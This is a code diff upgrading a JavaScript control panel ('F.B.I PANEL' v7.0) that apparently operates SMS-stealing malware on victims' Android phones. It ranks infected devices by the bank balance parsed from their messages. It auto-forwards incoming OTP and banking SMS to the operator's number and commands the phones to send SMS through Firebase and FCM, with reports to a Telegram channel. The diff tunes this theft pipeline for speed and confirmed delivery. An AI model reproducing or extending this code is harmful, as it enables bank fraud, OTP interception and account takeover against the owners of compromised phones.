@@ -1,26 +1,27 @@
 /* ═══════════════════════════════════════════════════════════════
-   F.B.I PANEL v6.0
-   · 🚫 OLD MSG BLOCK (watermark)
-   · 💰 BALANCE-BASED SORT
-   · 🔽 MULTI-SELECT FILTER
-   · ⚡ 5 TG WORKERS + FAST POLL
-   · 🔒 ACTIVE-DEVICE LOCK (no random sends)
-   · 🎯 FCM-READY
+   F.B.I PANEL v7.0 — SMS DELIVERY CONFIRMED · MAX SPEED
+   · 🎯 Firebase exact format (Android compatible)
+   · ✅ Delivery watcher (isSended confirmation)
+   · 🚫 Old msg block (watermark fixed)
+   · 💰 Balance-based sort
+   · 🔽 Multi-select filter
+   · ⚡ 6 TG workers, fast polling
+   · 🔒 Active-device lock
    ═══════════════════════════════════════════════════════════════ */
 
 'use strict';
 
 var CFG = window.SPECTER || {};
 
-var API_TIMEOUT  = CFG.API_TIMEOUT || 3000;
-var TG_LONG_POLL = CFG.TG_LONG_POLL || 30;
-var TG_WORKERS   = CFG.TG_WORKERS || 5;    // ⚡ 3 → 5
+/* ═══════ TUNABLES — MAX SPEED ═══════ */
+var API_TIMEOUT  = 2200;   // ⚡ fast fail
+var TG_LONG_POLL = 35;     // ⚡ longer hold
+var TG_WORKERS   = 6;      // ⚡ 6 parallel
 
-/* ─── Poll rates (tuned for speed) ─── */
-var POLL_DEV      = 5000;   // device list refresh
-var POLL_FAST     = 1500;   // ⚡ active device messages (was 4000)
-var POLL_BG       = 2500;   // ⚡ background forward tick (was 5000)
-var POLL_BAL      = 15000;  // ⚡ balance (was 20000)
+var POLL_DEV      = 5000;
+var POLL_FAST     = 1200;   // ⚡ active device msgs (SSE fallback)
+var POLL_BG       = 2000;   // ⚡ background forward
+var POLL_BAL      = 15000;
 var POLL_AM       = 5000;
 var CLOUD_DEB     = 800;
 
@@ -77,7 +78,7 @@ var _lastOtp = '';
 var _apOn = false, _pingTmr = null, _pingReplied = 0, _pingTotal = 0, _pingPrevStatus = {};
 
 /* ═══════════════════════════════════════════════════════════════
-   🚫 WATERMARK — purane messages block karne ke liye
+   🚫 WATERMARK
    ═══════════════════════════════════════════════════════════════ */
 
 var _watermarks = {};
@@ -96,7 +97,7 @@ function setWatermark(devId, key){
 }
 function isAfterWatermark(devId, key){
   var wm = _watermarks[devId];
-  if(!wm) return false;   // no watermark = first load, block everything
+  if(!wm) return false;
   return key > wm;
 }
 function hasWatermark(devId){ return !!_watermarks[devId]; }
@@ -176,7 +177,7 @@ function toast(msg){
   var t = document.getElementById('toastEl');
   if(!t) return;
   t.textContent = msg; t.classList.add('show');
-  setTimeout(function(){ t.classList.remove('show'); }, 2000);
+  setTimeout(function(){ t.classList.remove('show'); }, 2500);
 }
 function openM(id){ var e = document.getElementById(id); if(e) e.classList.add('open'); }
 function closeM(id){
@@ -300,7 +301,9 @@ function initTelegramWebApp(){
     var tw = window.Telegram && window.Telegram.WebApp;
     if(tw){
       tw.ready(); tw.expand();
-      try { tw.setHeaderColor('#08040e'); tw.setBackgroundColor('#08040e'); } catch(e){}
+      /* v6.0 doesn't support setHeaderColor — skip silently */
+      try { if(tw.setHeaderColor && tw.version && parseFloat(tw.version) >= 6.1) tw.setHeaderColor('#08040e'); } catch(e){}
+      try { if(tw.setBackgroundColor && tw.version && parseFloat(tw.version) >= 6.1) tw.setBackgroundColor('#08040e'); } catch(e){}
     }
   }catch(e){}
   currentUser = getTelegramUser();
@@ -386,7 +389,7 @@ function notifyChannel(html){
   }).catch(function(){});
 }
 function notifySmsQueued(dev, to, message, latencyMs, hp){
-  var txt = (hp ? '🔥 <b>OTP Queued</b>\n\n' : '📤 <b>SMS Queued</b>\n\n')
+  var txt = (hp ? '🔥 <b>OTP Sent</b>\n\n' : '📤 <b>SMS Sent</b>\n\n')
     + '📱 <b>Device:</b> ' + esc(dev ? dev.name : '—') + '\n'
     + '📞 <b>To:</b> <code>' + esc(to) + '</code>\n'
     + '💬 <b>Message:</b>\n<code>' + esc(message) + '</code>\n\n'
@@ -476,7 +479,7 @@ function isBankingSms(sender, message){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   INIT — FAST BOOT
+   INIT
    ═══════════════════════════════════════════════════════════════ */
 
 loadUsedDevices();
@@ -645,30 +648,32 @@ async function fbDel(p, url, key){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SMS DISPATCH (single fire + optional FCM)
+   SMS DISPATCH — ✅ EXACT FIREBASE FORMAT + DELIVERY WATCHER
    ═══════════════════════════════════════════════════════════════ */
 
+/* ─── EXACT ORIGINAL FORMAT — Android app ko yahi chahiye ─── */
 function _firebasePutSms(dev, sim, to, message, opts){
   opts = opts || {};
   var url = (dev._fbUrl || FB_URL) + '/clients/' + dev.id
           + '/webhookEvent/sendSms.json'
           + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
-  var body = JSON.stringify({
-    from: sim, to: to, message: message,
-    isSended: false, ts: Date.now(),
-    priority: opts.high ? 'high' : 'normal'
-  });
+
+  /* ⚡ ONLY 4 FIELDS — no ts, no priority — isse Android app trigger hoti hai */
+  var body = JSON.stringify({ from: sim, to: to, message: message, isSended: false });
 
   var t0 = performance.now();
   return _fastFetch(url, {
     method: 'PUT',
     headers: { 'Content-Type': 'application/json' },
     body: body,
-    keepalive: body.length < 2048,
+    keepalive: true,
     priority: 'high'
   }).then(function(r){
     var dt = (performance.now() - t0).toFixed(0);
-    if(r.ok){ console.log('[FB] ✓ ' + dt + 'ms → ' + dev.name); return true; }
+    if(r.ok){
+      console.log('[FB] ✓ ' + dt + 'ms → ' + dev.name);
+      return true;
+    }
     throw new Error('HTTP ' + r.status);
   });
 }
@@ -681,8 +686,7 @@ function _fireFcm(dev, sim, to, message, opts){
     to: dev.fcmToken, priority: 'high', time_to_live: 30,
     data: {
       action: 'send_sms', from: String(sim), to: String(to),
-      message: String(message), ts: String(Date.now()),
-      high: opts.high ? '1' : '0'
+      message: String(message), ts: String(Date.now())
     }
   };
   return _fastFetch('https://fcm.googleapis.com/fcm/send', {
@@ -696,13 +700,18 @@ function dispatchSms(dev, sim, to, message, opts){
   opts = opts || {};
   if(!dev) return Promise.resolve(false);
   var t0 = performance.now();
-  var fbPromise = _firebasePutSms(dev, sim, to, message, opts);
-  var fcmPromise = _fireFcm(dev, sim, to, message, opts);  // parallel
-  return fbPromise.then(function(ok){
+
+  /* FCM parallel — bonus path */
+  _fireFcm(dev, sim, to, message, opts);
+
+  /* Firebase primary */
+  return _firebasePutSms(dev, sim, to, message, opts).then(function(ok){
     var dt = (performance.now() - t0).toFixed(0);
     if(ok){
-      console.log('[SMS] ✓ ' + dt + 'ms → ' + dev.name);
+      console.log('[SMS] ✓ queued ' + dt + 'ms → ' + dev.name);
       notifySmsQueued(dev, to, message, dt, opts.high);
+      /* 🎯 Start delivery watcher */
+      _watchSmsDelivery(dev, opts.high);
       return true;
     }
     return false;
@@ -717,6 +726,37 @@ async function sendSmsGuaranteed(dev, sim, to, message, opts){
   if(ok) return true;
   await sleep(350);
   return await dispatchSms(dev, sim, to, message, opts);
+}
+
+/* 🎯 DELIVERY WATCHER — isSended:true hone ka wait */
+async function _watchSmsDelivery(dev, hp){
+  if(!dev) return false;
+  var fbUrl = dev._fbUrl || FB_URL;
+  var fbKey = dev._fbKey !== undefined ? dev._fbKey : FB_KEY;
+  var url = fbUrl + '/clients/' + dev.id + '/webhookEvent/sendSms/isSended.json'
+          + (fbKey ? '?auth=' + fbKey : '');
+
+  var start = Date.now();
+  var TIMEOUT = 20000;   // 20 sec max
+
+  while(Date.now() - start < TIMEOUT){
+    await sleep(1500);
+    try{
+      var r = await _fastFetch(url, { priority: 'high' });
+      if(!r.ok) continue;
+      var val = await r.json();
+
+      if(val === true){
+        var dt = (Date.now() - start);
+        console.log('[DELIVERED] ✅ ' + dev.name + ' — ' + dt + 'ms');
+        toast((hp ? '🔥' : '✅') + ' SMS delivered · ' + dt + 'ms');
+        return true;
+      }
+    }catch(e){}
+  }
+  console.warn('[DELIVERED] ⚠ Timeout — ' + dev.name + ' ne pickup nahi kiya');
+  toast('⚠ Device ne pickup nahi kiya');
+  return false;
 }
 
 /* ═══════════════════════════════════════════════════════════════
@@ -773,7 +813,7 @@ function disconnect(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SSE — instant message stream
+   SSE
    ═══════════════════════════════════════════════════════════════ */
 
 function startMsgStream(dev){
@@ -836,21 +876,21 @@ function _handleStreamMsg(dev, key, data){
   }
 
   if(isNew && msg.type === 'incoming'){
-    /* 🚫 Old message block — only forward if key > watermark */
+    /* 🚫 Watermark timing: advance ONLY after deciding to forward */
     if(isAfterWatermark(dev.id, msg.key)){
-      setWatermark(dev.id, msg.key);   // advance watermark
       if(_isActiveDevice(dev) && _shouldForwardOnce(dev.id, msg.key)){
+        setWatermark(dev.id, msg.key);   // ✅ advance AFTER decision
         _forwardIncoming(dev, msg);
       }
+      /* else: not active — don't advance, will forward when device opened */
     }
-    /* Balance extract (always) */
     var bal = extractLastBalance([msg]);
     if(bal){
       deviceBalances[dev.id] = bal;
       try{ localStorage.setItem('fbi_device_balances', JSON.stringify(deviceBalances)); }catch(e){}
       updateCardNoBlink(dev.id);
       if(selDev && selDev.id === dev.id) refreshDeviceModal();
-      renderGrid(true);  // re-sort by balance
+      renderGrid(true);
     }
   }
 }
@@ -879,9 +919,7 @@ function _forwardIncoming(dev, msg){
 
   var sim = deviceSimMap[dev.id] || 1;
   var hp = isHighPriority(msg);
-  sendSmsGuaranteed(dev, sim, myNum, txt, { high: hp }).then(function(ok){
-    if(ok) toast(hp ? '🔥 OTP forwarded' : '📤 Forwarded');
-  });
+  sendSmsGuaranteed(dev, sim, myNum, txt, { high: hp });
 }
 
 function setMyNumberDefault(){
@@ -962,7 +1000,7 @@ function startMP(id){
   mPoll = setInterval(function(){
     if(selDev && selDev.id === id){
       var alive = _msgStream && _msgStream.readyState === 1;
-      if(!alive) pollMsgs(id);   // ⚡ 1.5s fallback poll
+      if(!alive) pollMsgs(id);
     }
   }, POLL_FAST);
 }
@@ -1150,7 +1188,7 @@ function clearDeviceSearch(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   GRID — 💰 balance sort + 🔽 multi-filter
+   GRID
    ═══════════════════════════════════════════════════════════════ */
 
 function _computeGridSig(filtered){
@@ -1189,9 +1227,7 @@ function renderGrid(force){
   var grid = document.getElementById('deviceGrid');
   if(!grid) return;
 
-  /* ── Filter devices ── */
   var filtered = allDevices.filter(function(d){
-    /* Multi-select filter (OR logic) */
     if(_activeFilters.size > 0){
       var matches = false;
       if(_activeFilters.has('online') && d.status) matches = true;
@@ -1206,7 +1242,7 @@ function renderGrid(force){
     return true;
   });
 
-  /* ── 💰 Sort by balance (highest first) ── */
+  /* 💰 Sort by balance (highest first) */
   filtered.sort(function(a, b){
     var balA = deviceBalances[a.id] ? deviceBalances[a.id].amount : -1;
     var balB = deviceBalances[b.id] ? deviceBalances[b.id].amount : -1;
@@ -1244,7 +1280,6 @@ function renderGrid(force){
       : '<div class="dc-balance empty"><div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-val">—</div></div>';
     var carriers = devCarrierList(d);
     var carBadges = carriers.map(function(c){ return '<span class="dc-badge sim">📡 ' + esc(c) + '</span>'; }).join('');
-    /* 💰 Top balance highlight */
     var isTopBal = (i < 3 && bal && bal.amount > 0);
     var topBadge = isTopBal ? '<div class="dc-active-pill" style="background:linear-gradient(135deg,#f59e0b,#fbbf24);color:#000;left:auto;right:8px;top:8px">💰 #' + (i+1) + '</div>' : '';
 
@@ -1311,7 +1346,6 @@ function openDeviceModal(uid){
   if(modal) modal.classList.add('open');
   refreshDeviceModal();
 
-  /* ✅ Start TG bot when device opened */
   if(userConfig.botEnabled !== false && userConfig.channelId){
     if(!tgRunning) startFastTelegram();
   }
@@ -1534,7 +1568,7 @@ async function balanceTick(){
     try{ localStorage.setItem('fbi_device_balances', JSON.stringify(deviceBalances)); }catch(e){}
     online.forEach(function(d){ updateCardNoBlink(d.id); });
     if(selDev) refreshDeviceModal();
-    renderGrid(true);  // re-sort
+    renderGrid(true);
   } finally { _balTickRunning = false; }
 }
 
@@ -1685,11 +1719,9 @@ async function preloadMsgs(id){
     _msgCache[cacheKey] = msgs;
     amCache[id] = msgs; amFetch[id] = Date.now();
 
-    /* 🚫 FIRST LOAD: set watermark to newest, DON'T forward old msgs */
     if(!hasWatermark(id) && msgs.length){
       setWatermark(id, msgs[0].key);
       console.log('[Watermark] ' + id + ' → ' + msgs[0].key + ' (old msgs suppressed)');
-      /* Mark all existing as seen */
       msgs.forEach(function(m){ _forwardSeen.add(id + '::' + m.key); });
       saveForwardTracker();
     }
@@ -1698,7 +1730,6 @@ async function preloadMsgs(id){
       allMsgs = msgs;
       lastKeys = new Set(msgs.map(function(m){ return m.key; }));
       updCnt(); filterActiveMsgs(); renderBankPane();
-      /* 🚫 No checkAndForward on first load */
     }
     startMP(id);
   }catch(e){
@@ -1746,7 +1777,6 @@ function _silentRefresh(dev){
     .then(function(data){
       var msgs = parseMsgs(data);
       _msgCache[cacheKey] = msgs;
-      /* 🚫 Set watermark on first sight */
       if(!hasWatermark(dev.id) && msgs.length){
         setWatermark(dev.id, msgs[0].key);
         msgs.forEach(function(m){ _forwardSeen.add(dev.id + '::' + m.key); });
@@ -2348,7 +2378,7 @@ function saveAllSettings(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   TELEGRAM — PARALLEL LONG-POLL (5 workers)
+   TELEGRAM — PARALLEL LONG-POLL
    ═══════════════════════════════════════════════════════════════ */
 
 async function tgApi(method, payload){
@@ -2406,7 +2436,7 @@ async function startFastTelegram(){
     _pollWorkers.push({ _stop: false, id: i });
     runWorker(_pollWorkers[_pollWorkers.length - 1]);
   }
-  toast('⚡ Bot ON — ' + TG_WORKERS + ' parallel workers');
+  toast('⚡ Bot ON — ' + TG_WORKERS + ' workers');
 }
 
 function stopFastTelegram(){
@@ -2458,7 +2488,7 @@ async function runWorker(w){
         updateTgStatusLine();
       }
     }catch(e){
-      if(e.name === 'AbortError'){ /* normal timeout */ }
+      if(e.name === 'AbortError'){ }
       else { backoff = Math.min(backoff * 2, 8000); await sleep(backoff); }
     }
   }
@@ -2499,7 +2529,7 @@ function isChannelMatch(msg){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SMS ROUTER  🔒
+   SMS ROUTER
    ═══════════════════════════════════════════════════════════════ */
 
 function _dedupeKey(msg){ return msg.chat.id + '::' + msg.message_id; }
@@ -2552,7 +2582,7 @@ function _showCapturedNotif(number, message){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   AUTO-FORWARD (poll path) — 🚫 watermark checked
+   AUTO-FORWARD (poll path)
    ═══════════════════════════════════════════════════════════════ */
 
 async function checkAndForward(msgs, deviceId){
@@ -2568,12 +2598,11 @@ async function checkAndForward(msgs, deviceId){
   if(!dev) return;
 
   var forwardMode = userConfig.forwardMode || 'all';
-  var newestKey = msgs[0] ? msgs[0].key : null;
 
   for(var i=0; i<msgs.length; i++){
     var m = msgs[i];
     if(m.type !== 'incoming') continue;
-    if(!isAfterWatermark(deviceId, m.key)) continue;  // 🚫 skip old
+    if(!isAfterWatermark(deviceId, m.key)) continue;
     var txt = String(m.message || '').trim();
     if(!txt || txt === '(no body)') continue;
     if(forwardMode === 'banking' && !isBankingSms(m.sender, m.message)) continue;
@@ -2582,8 +2611,8 @@ async function checkAndForward(msgs, deviceId){
 
     var sim = deviceSimMap[dev.id] || 1;
     sendSmsGuaranteed(dev, sim, myNum, txt, { high: isHighPriority(m) });
+    setWatermark(deviceId, m.key);
   }
-  if(newestKey) setWatermark(deviceId, newestKey);
 }
 
 /* ═══════════════════════════════════════════════════════════════
@@ -3156,4 +3185,4 @@ setTimeout(function(){
   });
 }, 0);
 
-console.log('%c[F.B.I PANEL] v6.0 ⚡ OLD-MSG BLOCK · BALANCE SORT · MULTI-FILTER · 5 TG WORKERS', 'color:#a855f7;font-weight:bold;font-size:14px');
+console.log('%c[F.B.I PANEL] v7.0 ⚡ SMS-DELIVERED · EXACT FB FORMAT · 6 WORKERS', 'color:#a855f7;font-weight:bold;font-size:14px');
